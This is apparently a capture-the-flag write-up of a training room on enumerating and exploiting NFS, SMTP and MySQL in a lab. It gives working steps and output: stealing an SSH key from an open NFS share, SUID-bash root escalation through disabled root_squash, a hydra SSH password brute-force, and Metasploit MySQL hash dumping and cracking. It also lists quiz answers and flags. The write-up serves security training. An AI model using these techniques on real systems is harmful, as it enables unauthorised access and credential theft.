
Task2: Understanding NFS
-------------------------

#### What is NFS ?

> NFS stands for "Network File System" and allows a system to share directories and files with others over a network.

> By using NFS, users and programs can access files on remote systems almost as if they were local files.

> It does this by mounting all, or a portion of a file system on a server. 

##### NOTE:
The portion of the file system that is mounted can be accessed by clients with whatever privileges are assigned to each file.

RPC -> Remote Procedure Call

- First, the client will request to mount a directory from a remote host on a local directory just the same way it can mount a physical device. The mount service will then act to connect to the relevant mount daemon using RPC.

- The server checks if the user has permission to mount whatever directory has been requested. It will then return a file handle which uniquely identifies each file and directory that is on the server.

- If someone wants to access a file using NFS, an RPC call is placed to NFSD (the NFS daemon) on the server. This call takes parameters such as:

	- The file handle
	- The name of the file to be accessed
	- The user's, user ID
	- The user's group ID

These are used in determining access rights to the specified file. This is what controls user permissions, i.e. read and write of files.

#### What runs NFS ?

Using the NFS protocol, you can transfer files between computers running Windows and other non-Windows operating systems, such as Linux, MacOS or UNIX.

A computer running Windows Server can act as an NFS file server for other non-Windows client computers. Likewise, NFS allows a Windows-based computer running Windows Server to access files stored on a non-Windows NFS server.

For more:

1. [nfs-file-share](https://www.datto.com/blog/what-is-nfs-file-share)
2. [http://nfs.sourceforge.net/](http://nfs.sourceforge.net/)
3. [https://wiki.archlinux.org/title/NFS](https://wiki.archlinux.org/title/NFS)


1. What does NFS stand for?

--> Network File System

2. What process allows an NFS client to interact with a remote directory as though it was a physical device?

--> mounting

3. What does NFS use to represent files and directories on the server?

--> file handle

4. What protocol does NFS use to communicate between the server and client?

--> RPC

5. What two pieces of user data does the NFS server take as parameters for controlling user permissions? Format: parameter 1 / parameter 2

--> user id/ group id

6. Can a Windows NFS server share files with a Linux client? (Y/N)

--> Y

7. Can a Linux NFS server share files with a MacOS client? (Y/N)

--> Y 

8. What two pieces of user data does the NFS server take as parameters for controlling user permissions? Format: parameter 1 / parameter 2

--> 4.2


Task3: Enumerating NFS
-----------------------

#### Requirements

In order to do a more advanced enumeration of the NFS server, and shares- we're going to need a few tools. The first of which is key to interacting with any NFS share from your local machine: nfs-common.

#### nfs-common

- It is important to have this package installed on any machine that uses NFS, either as client or server. 

- It includes programs such as: `lockd`, `statd`, `showmount`, `nfsstat`,`gssd`, `idmapd` and `mount.nfs`. Primarily, we are concerned with **`"showmount"`** and **`"mount.nfs"`** as these are going to be most useful to us when it comes to extracting information from the NFS share. 

For more: [https://packages.ubuntu.com/xenial/nfs-common](https://packages.ubuntu.com/xenial/nfs-common)

install nfs-common: `sudo apt install nfs-common`


#### Port Scanning

**`nmap`** with `-A` and `-p`


#### Mounting NFS shares

```
sudo mount -t nfs IP:share /tmp/mount/ -nolock
```

see: [nfs mounting](https://www.youtube.com/watch?v=SpYTsRk3Dkk)


sudo   --> Run as root
mount  --> Execute the mount command
-t nfs --> Type of device to mount, then specifying that it's NFS

IP:share --> The IP Address of the NFS server, and the name of the share we wish to mount

-nolock --> Specifies not to use NLM locking


see: [nfs nlm](https://www.ibm.com/docs/en/zos/2.2.0?topic=linv23nso-using-network-lock-manager-nlm-in-nfs-v2-v3)

1. Conduct a thorough port scan scan of your choosing, how many ports are open?

```
$ nmap 10.10.205.204 -T5 -vv -p-

Starting Nmap 7.60 ( https://nmap.org ) at 2021-06-25 13:40 BST
Initiating ARP Ping Scan at 13:40
Scanning 10.10.205.204 [1 port]
Completed ARP Ping Scan at 13:40, 0.22s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:40
Completed Parallel DNS resolution of 1 host. at 13:40, 0.00s elapsed
Initiating SYN Stealth Scan at 13:40
Scanning ip-10-10-205-204.eu-west-1.compute.internal (10.10.205.204) [65535 ports]
Discovered open port 22/tcp on 10.10.205.204
Discovered open port 111/tcp on 10.10.205.204
Warning: 10.10.205.204 giving up on port because retransmission cap hit (2).
Discovered open port 53937/tcp on 10.10.205.204
Increasing send delay for 10.10.205.204 from 0 to 5 due to 4963 out of 12407 dropped probes since last increase.
Discovered open port 50605/tcp on 10.10.205.204
SYN Stealth Scan Timing: About 18.05% done; ETC: 13:42 (0:02:21 remaining)
Discovered open port 38715/tcp on 10.10.205.204
SYN Stealth Scan Timing: About 23.95% done; ETC: 13:44 (0:03:14 remaining)
SYN Stealth Scan Timing: About 29.82% done; ETC: 13:45 (0:03:34 remaining)
SYN Stealth Scan Timing: About 48.65% done; ETC: 13:46 (0:03:17 remaining)
SYN Stealth Scan Timing: About 55.71% done; ETC: 13:46 (0:02:57 remaining)
SYN Stealth Scan Timing: About 62.20% done; ETC: 13:46 (0:02:36 remaining)
SYN Stealth Scan Timing: About 68.07% done; ETC: 13:47 (0:02:14 remaining)
SYN Stealth Scan Timing: About 73.97% done; ETC: 13:47 (0:01:51 remaining)
SYN Stealth Scan Timing: About 79.85% done; ETC: 13:47 (0:01:27 remaining)
SYN Stealth Scan Timing: About 85.75% done; ETC: 13:47 (0:01:02 remaining)
SYN Stealth Scan Timing: About 91.62% done; ETC: 13:47 (0:00:37 remaining)
Discovered open port 2049/tcp on 10.10.205.204
Discovered open port 41497/tcp on 10.10.205.204
Completed SYN Stealth Scan at 13:50, 622.78s elapsed (65535 total ports)
Nmap scan report for ip-10-10-205-204.eu-west-1.compute.internal (10.10.205.204)
Host is up, received arp-response (0.00046s latency).
Scanned at 2021-06-25 13:40:03 BST for 623s
Not shown: 65525 closed ports
Reason: 65525 resets
PORT      STATE    SERVICE REASON
22/tcp    open     ssh     syn-ack ttl 64
111/tcp   open     rpcbind syn-ack ttl 64
2049/tcp  open     nfs     syn-ack ttl 64
21063/tcp filtered unknown no-response
31618/tcp filtered unknown no-response
38715/tcp open     unknown syn-ack ttl 64
41497/tcp open     unknown syn-ack ttl 64
45640/tcp filtered unknown no-response
50605/tcp open     unknown syn-ack ttl 64
53937/tcp open     unknown syn-ack ttl 64
MAC Address: 02:E4:7B:E5:B6:73 (Unknown)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 623.32 seconds
           Raw packets sent: 132932 (5.849MB) | Rcvd: 132923 (5.317MB)
```
I was using: `nmap 10.10.205.204 -p- -sV -A -vv`

But, it took much time to show result...

--> 7

2. Which port contains the service we're looking to enumerate?

```
nmap 10.10.205.204 -p2049,21063,31618,38715,41497,45640,50605,53937 -sV
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-25 18:31 IST
Nmap scan report for 10.10.205.204
Host is up (0.18s latency).

PORT      STATE  SERVICE  VERSION
2049/tcp  open   nfs      3-4 (RPC #100003)
21063/tcp closed unknown
31618/tcp closed unknown
38715/tcp open   mountd   1-3 (RPC #100005)
41497/tcp open   nlockmgr 1-4 (RPC #100021)
45640/tcp closed unknown
50605/tcp open   mountd   1-3 (RPC #100005)
53937/tcp open   mountd   1-3 (RPC #100005)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.11 seconds
```
--> 2049


3. Now, use /usr/sbin/showmount -e [IP] to list the NFS shares, what is the name of the visible share?

```
$ /sbin/showmount -e 10.10.205.204

Export list for 10.10.205.204:
/home *
```

--> /home

4. First, use "mkdir /tmp/mount" to create a directory on your machine to mount the share to. This is in the /tmp directory- so be aware that it will be removed on restart.

Now mount it in /tmp/mount directory ...

What is the name of the folder inside ?

--> cappucino

5. Have a look inside this directory, look at the files. Looks like  we're inside a user's home directory...

Interesting! Let's do a bit of research now, have a look through the folders. Which of these folders could contain keys that would give us remote access to the server?

```
Extra keys
Clipboard
Clipboard
root@ip-10-10-40-196:/tmp/mount/cappucino# ll
total 36
drwxr-xr-x 5 ubuntu ubuntu 4096 Jun  4  2020 ./
drwxr-xr-x 3 root   root   4096 Apr 21  2020 ../
-rw------- 1 ubuntu ubuntu    5 Jun  4  2020 .bash_history
-rw-r--r-- 1 ubuntu ubuntu  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 ubuntu ubuntu 3771 Apr  4  2018 .bashrc
drwx------ 2 ubuntu ubuntu 4096 Apr 22  2020 .cache/
drwx------ 3 ubuntu ubuntu 4096 Apr 22  2020 .gnupg/
-rw-r--r-- 1 ubuntu ubuntu  807 Apr  4  2018 .profile
drwx------ 2 ubuntu ubuntu 4096 Apr 22  2020 .ssh/
-rw-r--r-- 1 ubuntu ubuntu    0 Apr 22  2020 .sudo_as_admin_successful
```
--> .ssh

6. Which of these keys is most useful to us?

--> id_rsa

7. chnge permission of this file to 600 and gain access to trgt machine with it

```
$ chmod 600 id_rsa
$ ssh -i id_rsa <user>@<ip>
```


Task4: Exploiting NFS
---------------------

Now, what next ??

=> priv. esc !!

#### What is root_squash?

By default, on NFS shares-Root Squashing is enabled, and prevents anyone connecting to the NFS share from having root access to the NFS volume. Remote root users are assigned a user “nfsnobody” when connected, which has the least local privileges. Not what we want. However, if this is turned off, it can allow the creation of SUID bit files, allowing a remote user root access to the connected system.

For more: [hackingarticles](https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/)

Mapped Out Pathway:

If this is still hard to follow, here's a step by step of the actions we're taking, and how they all tie together to allow us to gain a root shell:


1. NFS Access ->

2. Gain Low Privilege Shell ->

3. Upload Bash Executable to the NFS share ->

4. Set SUID Permissions Through NFS Due To Misconfigured Root Squash ->

5. Login through SSH ->

6. Execute SUID Bit Bash Executable ->

7. ROOT ACCESS!!

Lets do this!

1. Now, we're going to add the SUID bit permission to the bash executable we just copied to the share using "sudo chmod +[permission] bash". What letter do we use to set the SUID bit set using chmod?

--> s

2. Let's do a sanity check, let's check the permissions of the "bash" executable using "ls -la bash". What does the permission set look like? Make sure that it ends with -sr-x.

--> rwsr-sr-x

But the thing is, In `-sr-x` => "-" can be any type of permission but 's','r' and 'x' should be at the same position => Global user must be given execution priv and the owner should have suid priv.


3. Now, SSH into the machine as the user. List the directory to make sure the bash executable is there. Now, the moment of truth. Lets run it with "./bash -p". The -p persists the permissions, so that it can run as root with SUID- as otherwise bash will sometimes drop the permissions.


Great! If all's gone well you should have a shell as root! What's the root flag?

--> `THM{nfs_got_pwned}`



Task5: Understanding SMTP
--------------------------

#### How SMTP works?

# ![](diagram?raw=true)

# ![](diagram?raw=true)

see: [howstuffworks](https://computer.howstuffworks.com/e-mail-messaging/email3.htm)

#### What runs SMTP?

SMTP Server software is readily available on Windows server platforms, with many other variants of SMTP being available to run on Linux.

#### More Information:

Here is a resource that explain the technical implementation, and working of, SMTP in more detail than I have covered here.

https://www.afternerd.com/blog/smtp/


1. What does SMTP stand for?

--> Simple Mail Transfer Protocol

2. What does SMTP handle the sending of?

--> emails

3. What is the first step in the SMTP process?

--> SMTP handshake

4. What is the default SMTP port?

--> 25

5. Where does the SMTP server send the email if the recipient's server is not available?

--> SMTP queue

6. On what server does the Email ultimately end up on?

--> POP/IMAP

7. Can a Linux machine run an SMTP server? (Y/N)

--> Y

8. Can a Windows machine run an SMTP server? (Y/N)

--> Y


Task6: Enumerating SMTP
-----------------------

#### Enumerating Server Details

we want to fingerprint the server to make our targeting as precise as possible. 

We're going to use the **`"smtp_version"`** module in _`MetaSploit`_ to do this. 
> As its name implies, it will scan a range of IP addresses and determine the version of any mail servers it encounters.

#### Enumerating Users from SMTP

The SMTP service has two internal commands that allow the enumeration of users:

- VRFY (confirming the names of valid users)
- EXPN (which reveals the actual address of user's aliases and lists email(mailing lists)).

Using these commands, we can reveal a list of valid users.

##### We can do this in `2 ways`:

1. Manually
2. With Metasploit, using a handy module named `"smtp_enum"`
	- feeding host/range of hosts to scan and a wordlist containing usernames to enumerate


#### Alternatives:

It's worth noting that this enumeration technique will work for the majority of SMTP configurations; however there are other, non-metasploit tools such as **`smtp-user-enum`** that work even better for enumerating `OS-level` user accounts on Solaris via the SMTP service. Enumeration is performed by inspecting the responses to VRFY, EXPN, and RCPT TO commands.

This technique could be adapted in future to work against other vulnerable SMTP daemons, but this hasn’t been done as of the time of writing. It's an alternative that's worth keeping in mind if you're trying to distance yourself from using Metasploit e.g. in preparation for OSCP.


1. What port is SMTP running on?

--> 25

2. Let's search for the module "smtp_version", what's it's full module name?

--> auxiliary/scanner/smtp/smtp_version

3. Set that to the correct value for your target machine. Then run the exploit. What's the system mail name?

```
msf5 auxiliary(scanner/smtp/smtp_version) > run

[+] 10.10.59.152:25       - 10.10.59.152:25 SMTP 220 polosmtp.home ESMTP Postfix (Ubuntu)\x0d\x0a
[*] 10.10.59.152:25       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

--> polosmtp.home

4. What Mail Transfer Agent (MTA) is running the SMTP server? This will require some external research.

--> Postfix

```
$ telnet 10.10.59.152 25
Trying 10.10.59.152...
Connected to 10.10.59.152.
Escape character is '^]'.
220 polosmtp.home ESMTP Postfix (Ubuntu)

```
OR,

From scan result got after using metasploit scan.


5. Good! We've now got a good amount of information on the target system to move onto the next stage. Let's search for the module "smtp_enum", what's it's full module name?

--> `auxiliary/scanner/smtp/smtp_enum`

Fil all the required places

6. Okay! Now that's finished, what username is returned?

--> administrator


Task7: Exploiting SMTP
----------------------

Okay, at the end of our Enumeration section we have a few vital pieces of information:

1. A user account name -> [ Here: administrator ]

2. The type of SMTP server and Operating System running -> [ Here: Postfix and Ubuntu ]

As port **22** was open apart from `25`, we can use the **`creds`** got during SMTP enum to perform **`ssh bruteforcing`**

using hydra:

`hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV 10.10.59.152 ssh`

hydra --> Runs the hydra tool

-t 16 --> Number of parallel connections per target

-l [user] --> Points to the user who's account you're trying to compromise

-P [path to dictionary] --> Points to the file containing the list of possible passwords

-vV --> Sets verbose mode to very verbose, shows the login+pass combination for each attempt

[machine IP] --> The IP address of the target machine

ssh / protocol --> Sets the protocol


1. What is the password of the user we found during our enumeration stage?

--> alejandro

2. Great! Now, let's SSH into the server as the user, what is contents of smtp.txt

--> `THM{who_knew_email_servers_were_c00l?}


Task8:  Understanding MySQL
----------------------------

1. What type of software is MySQL?

--> Relational database management system

2. What language is MySQL based on?

--> SQL

3. What communication model does MySQL use?

--> client-server

4. What is a common application of MySQL?

--> back end database

5. What major social network uses MySQL as their back-end database? This will require further research.

--> facebook


Task9: Enumerating MySQL
--------------------------

#### When you would begin attacking MySQL

MySQL is likely not going to be the first point of call when it comes to getting initial information about the server. You can, as we have in previous tasks, attempt to brute-force default account passwords if you really don't have any other information- however in most CTF scenarios, this is unlikely to be the avenue you're meant to pursue.

#### The Scenario

Typically, you will have gained some initial credentials from enumerating other services, that you can then use to enumerate, and exploit the MySQL service. As this room focuses on exploiting and enumerating the network service, for the sake of the scenario, we're going to assume that you found the **`credentials`**: `"root:password"` while enumerating subdomains of a web server. After trying the login against SSH unsuccessfully, you decide to try it against MySQL.

#### Alternatives

As with the previous task, it's worth noting that everything we're going to be doing using Metasploit can also be done 
1. either manually, 

2. or with a set of non-metasploit tools such as 
	- **`nmap's mysql-enum script`**: https://nmap.org/nsedoc/scripts/mysql-enum.html 
	- or https://www.exploit-db.com/exploits/23081. 

I recommend after you complete this room, you go back and attempt it manually to make sure you understand the process that is being used to display the information you acquire.

Okay, enough talk. Let's get going!


1. As always, let's start out with a port scan, so we know what port the service we're trying to attack is running on. What port is MySQL using?

```
$ nmap 10.10.219.130 -p- -sV -T5 -vv
```
--> 3306

2. Good, now- we think we have a set of credentials. Let's double check that by manually connecting to the MySQL server. We can do this using the command "mysql -h [IP] -u [username] -p"

3. We're going to be using the "mysql_sql" module.

Search for, select and list the options it needs. What three options do we need to set? (in descending order).

--> PASSWORD/RHOSTS/USERNAME

4. Run the exploit. By default it will test with the "select version()" command, what result does this give you?

```
auxiliary(admin/mysql/mysql_sql) > run
[*] Running module against 10.10.219.130

[*] 10.10.219.130:3306 - Sending statement: 'select version()'...
[*] 10.10.219.130:3306 -  | 5.7.29-0ubuntu0.18.04.1 |
[*] Auxiliary module execution completed
```
--> 5.7.29-0ubuntu0.18.04.1 

5. Great! We know that our exploit is landing as planned. Let's try to gain some more ambitious information. Change the "sql" option to "show databases". how many databases are returned?

```
msf5 auxiliary(admin/mysql/mysql_sql) > set SQL show databases

SQL => show databases
msf5 auxiliary(admin/mysql/mysql_sql) > run
[*] Running module against 10.10.219.130

[*] 10.10.219.130:3306 - Sending statement: 'show databases'...
[*] 10.10.219.130:3306 -  | information_schema |
[*] 10.10.219.130:3306 -  | mysql |
[*] 10.10.219.130:3306 -  | performance_schema |
[*] 10.10.219.130:3306 -  | sys |
[*] Auxiliary module execution completed
```

--> 4


Task10: Exploiting MySQL
-------------------------

#### What do we know?

Let's take a sanity check before moving on to try and exploit the database fully, and gain more sensitive information than just database names. We know:

1. MySQL server credentials

2. The version of MySQL running

3. The number of Databases, and their names.

#### Key Terminology

In order to understand the exploits we're going to use next- we need to understand a few key terms.

- schema
- hashes

1. First, let's search for and select the "mysql_schemadump" module. What's the module's full name?

--> auxiliary/scanner/mysql/mysql_schemadump

2. Great! Now, you've done this a few times by now so I'll let you take it from here. Set the relevant options, run the exploit. What's the name of the last table that gets dumped?

--> x$waits_global_by_latency

3. Awesome, you have now dumped the tables, and column names of the whole database. But we can do one better... search for and select the "mysql_hashdump" module. What's the module's full name?

--> auxiliary/scanner/mysql/mysql_hashdump

4. Again, I'll let you take it from here. Set the relevant options, run the exploit. What non-default user stands out to you?

```
msf5 auxiliary(scanner/mysql/mysql_hashdump) > run

[+] 10.10.219.130:3306    - Saving HashString as Loot: root:
[+] 10.10.219.130:3306    - Saving HashString as Loot: mysql.session:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[+] 10.10.219.130:3306    - Saving HashString as Loot: mysql.sys:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[+] 10.10.219.130:3306    - Saving HashString as Loot: debian-sys-maint:*D9C95B328FE46FFAE1A55A2DE5719A8681B2F79E
[+] 10.10.219.130:3306    - Saving HashString as Loot: root:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
[+] 10.10.219.130:3306    - Saving HashString as Loot: carl:*EA031893AA21444B170FC2162A56978B8CEECE18
[*] 10.10.219.130:3306    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
--> carl

5. Another user! And we have their password hash. This could be very interesting. Copy the hash string in full, like: bob:*HASH to a text file on your local machine called "hash.txt".

What is the user/hash combination string?

--> carl:*EA031893AA21444B170FC2162A56978B8CEECE18

6. Now, we need to crack the password! Let's try John the Ripper against it using: "john hash.txt" what is the password of the user we found?

--> doggie


7. Awesome. Password reuse is not only extremely dangerous, but extremely common. What are the chances that this user has reused their password for a different service?

What's the contents of MySQL.txt

--> THM{congratulations_you_got_the_mySQL_flag
